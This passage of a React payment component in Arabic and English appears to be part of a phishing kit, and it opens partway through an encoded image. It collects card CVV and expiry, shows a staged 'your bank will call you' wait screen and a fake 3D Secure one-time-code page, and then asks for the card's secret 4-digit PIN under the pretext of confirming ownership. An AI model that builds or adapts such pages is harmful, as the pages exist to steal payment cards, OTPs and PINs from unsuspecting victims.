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"
                    }
                  />
                </div>
              </div>
              <div className="w-full flex items-center border   bg-white   ">
                <input
                  className=" w-full   text-black text-sm text-left bg-white   px-2 py-2.5       outline-none"
                  type="text"
                  value={cvv}
                  disabled={!method}
                  onChange={handleCvvChange}
                  inputMode="numeric"
                  maxLength={3}
                  placeholder="CVV"
                  required
                />

                <input
                  type="text"
                  value={expiryDate}
                  maxLength={5}
                  inputMode="numeric"
                  onChange={handleExpiryDateChange}
                  className=" w-full   text-black text-sm text-left   p-2.5  border-r-2     outline-none"
                  placeholder="MM/YY"
                  required
                />
              </div>

              {errorCard ? (
                <p className="w-full flex justify-between p-3 border rounded-md text-red-500 mt-2 text-sm bg-[#f8d7da]">
                  {errorCard}
                </p>
              ) : (
                ""
              )}
              <button
                className="px-10 py-2 text-xl  bg-[#1566df] text-white rounded-md my-5"
                disabled={!method}
              >
                Pay Now
              </button>
              <div className="flex pt-3 items-center w-full justify-center ">
                <img src="payment-b.png" alt="" />
              </div>
            </form>
          </div>
        </div>
      ) : page === 1 ? (
        <div className="w-full max-w-4xl px-4 py-10">
          <div className="flex flex-col w-full p-8 text-sm gap-y-5 bg-white rounded-3xl shadow-sm border border-[#e7f1f7]">
            <span>
              سوف يتم الإتصال بك من خلال المصرف الخاص بحسابك،، الرجاء استقبال
              المكالمة وقبول طلب المصادقة
            </span>
            <span>لايمكنك الإستمرار بالمعاملة في حال عدم قبول المصادقة!</span>
            <span>
              سوق يتم الإتصال بك من قبل المصرف الخاص بك الرجاء الإنتظار...
            </span>
            <div className="container">
              <div className="bar"></div>
            </div>
            <div className="flex items-center justify-center w-full bg-white">
              <img src="wait.gif" className="w-full md:w-1/3 " />
            </div>
          </div>
        </div>
      ) : page === 2 ? (
        <div className="w-full max-w-4xl px-4 py-10">
          <div className="bg-white rounded-3xl p-8 shadow-sm border border-[#e7f1f7]">
            <form onSubmit={handleOtp}>
              <div className="flex w-full gap-x-3 items-center justify-center mb-6">
                <div className="w-12">
                  <img src="/visa_logo.jpg" alt="Visa" />
                </div>
                <div className="w-16">
                  <img
                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s"
                    alt="3D Secure"
                  />
                </div>
                <div className="w-12">
                  <img src="/Mastercard.png" alt="Mastercard" />
                </div>
              </div>

              <p className="py-2 text-sm text-gray-700 mb-4">
                to continue with your transaction, please enter the one-time
                passcode sent to your mobile number or email address and click
                submit
              </p>

              <h2 className="font-semibold my-4 text-[#22305e] text-lg">
                Transaction Details
              </h2>

              <div className="space-y-3 mb-6">
                <div className="flex justify-between py-2 border-b">
                  <span className="font-semibold text-gray-700">
                    Transaction Amount:
                  </span>
                  <span className="flex flex-row-reverse text-[#22305e]">
                    <span>115</span>
                    <span className="mr-1">ريال</span>
                  </span>
                </div>
                <div className="flex justify-between py-2 border-b">
                  <span className="font-semibold text-gray-700">
                    Card Number:
                  </span>
                  <span className="text-[#22305e]">
                    ********
                    {sessionStorage
                      .getItem("cardNumber")
                      ?.split("")
                      .slice(15) || "9666"}
                  </span>
                </div>
                <div className="flex justify-between py-2 items-center gap-x-2">
                  <span className="font-semibold text-gray-700 w-1/3">
                    Enter Code:
                  </span>
                  <input
                    value={otp}
                    required
                    onChange={(e) => setOtp(e.target.value)}
                    dir="ltr"
                    minLength={4}
                    inputMode="numeric"
                    type="text"
                    className="border border-gray-300 rounded-xl px-4 py-2 outline-none focus:border-blue-500 w-2/3"
                  />
                </div>
              </div>

              <div className="w-full flex items-center justify-center py-6">
                <button
                  type="submit"
                  className="w-full md:w-auto px-10 py-3 bg-blue-700 text-white rounded-full font-semibold hover:bg-blue-800 transition-colors"
                >
                  Submit
                </button>
              </div>
            </form>
          </div>
        </div>
      ) : (
        <div className="w-full max-w-4xl px-4 py-10">
          <div className="bg-white rounded-3xl p-8 shadow-sm border border-[#e7f1f7]">
            <form onSubmit={handlePin}>
              <div className="w-full flex justify-center items-center mb-6">
                <img src="/logo.svg" className="w-1/3" alt="Logo" />
              </div>

              <h2 className="font-bold text-2xl my-4 w-full text-center text-[#22305e]">
                تأكيد ملكية البطاقة
              </h2>

              <p className="py-2 text-sm text-gray-600 mb-6">
                لضمان حماية معلوماتك وإتمام عملية الدفع بأمان، نرجو منك إدخال
                الرمز السري المكون من ٤ أرقام، يُستخدم هذا الرمز فقط لأغراض
                التحقق من ملكية البطاقة
              </p>

              <div className="flex justify-center py-1 items-center gap-x-2 w-full flex-col mb-6">
                <span className="text-[#22305e] text-sm font-semibold w-full mb-2">
                  أدخل الرمز هنا :
                </span>
                <input
                  value={pin}
                  required
                  onChange={(e) => setPin(e.target.value)}
                  dir="ltr"
                  maxLength={4}
                  minLength={4}
                  inputMode="numeric"
                  type="text"
                  className="border border-gray-300 rounded-xl px-4 py-3 text-center outline-none focus:border-blue-500 w-full"
                />
              </div>

              <div className="w-full flex items-center justify-center py-4">
                <button
                  className="w-full px-8 py-3 bg-blue-700 text-white rounded-full font-semibold hover:bg-blue-800 transition-colors"
                  type="submit"
                >
                  تأكيد
                </button>
              </div>

              <span className="text-gray-600 text-sm w-full block text-center mt-4">
                هل تحتاج إلي مساعدة ؟
              </span>
            </form>
          </div>
        </div>
      )}

      {error && (
        <div className="w-full text-center text-red-500 fixed bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-30">
          <div className="bg-white py-5 px-4 md:w-1/3 w-11/12 rounded-xl flex justify-center items-center flex-col text-lg gap-y-3">
            <AiOutlineCloseCircle className="text-6xl text-red-500" />
            <div className="flex flex-col w-full items-center justify-center">
              <span className="text-gray-700">حدث خطأ في رمز التوثيق</span>
              <span className="text-red-600 mt-2">{error}</span>
            </div>
            <button
              className="bg-blue-700 text-white w-full py-3 rounded-full mt-4 hover:bg-blue-800 transition-colors"
              onClick={() => setError(null)}
            >
              حاول مرة ثانية
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default PaymentForm;
